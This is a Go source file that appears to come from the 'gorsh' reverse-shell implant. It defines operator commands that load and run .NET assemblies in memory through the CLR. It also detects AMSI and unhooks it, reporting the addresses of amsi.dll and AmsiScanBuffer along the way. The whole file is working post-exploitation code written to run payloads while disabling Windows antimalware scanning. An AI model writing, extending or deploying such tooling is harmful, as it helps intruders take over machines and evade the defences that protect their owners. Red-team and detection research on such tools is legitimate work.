package cmds

import (
	"fmt"
	"os"

	"github.com/audibleblink/gorsh/internal/execute_assembly"

	"github.com/abiosoft/ishell"
)

var (
	clr      = execute_assembly.CLR{}
	hostname string
)

func UnloadAssembly(c *ishell.Context) {
	clr.Active = ""
	ResetPrompt(c)
}

func LoadAssembly(c *ishell.Context) {
	if len(c.Args) != 1 {
		c.Println("must provide assembly name to load")
		return
	}

	name := c.Args[0]

	var err error
	if clr == (execute_assembly.CLR{}) {
		clr, err = execute_assembly.NewCLR()
		if err != nil {
			c.Printf("could not load clr: %v\n", err)
			return
		}
	}

	err = clr.Load(name)
	if err != nil {
		c.Printf("could not load %s: %s\n", name, err)
		return
	}

	ChangePrompt(c, name)
}

func ExecuteAssembly(c *ishell.Context) {
	if clr.Active == "" {
		c.Println("no assembly is currently loaded")
		return
	}
	stdout, stderr := clr.Execute(c.Args)
	c.Println(stdout)
	c.Println(stderr)
}

func ResetPrompt(c *ishell.Context) {
	c.SetPrompt(fmt.Sprintf("[%s]> ", GetHostname()))
}

func ChangePrompt(c *ishell.Context, module string) {
	c.SetPrompt(fmt.Sprintf("[%s] %s > ", GetHostname(), module))
}

func Amsi(c *ishell.Context) {
	hasAmsi, dll, err := execute_assembly.HasAmsi()
	if err != nil {
		c.Printf("failed to check for amsi: %v\n", err)
		return
	}

	if !hasAmsi {
		c.Println("amsi not detected")
		return
	}

	c.Println("amsi detected")
	c.Printf("amsi.dll: 						%#v\n", dll.DllBase)
	c.Printf("amsi.AmsiScanBuffer:	%#v\n", dll.FnPtr)

	c.Println("attempting unhook")
	err = execute_assembly.UnhookAmsi(dll.DllBase)
	if err != nil {
		c.Printf("failed to unhook amsi: %v\n", err)
		return
	}
	c.Println("unhook successful")
}

func GetHostname() string {
	if hostname != "" {
		return hostname
	}
	hostname, _ = os.Hostname()
	return hostname
}
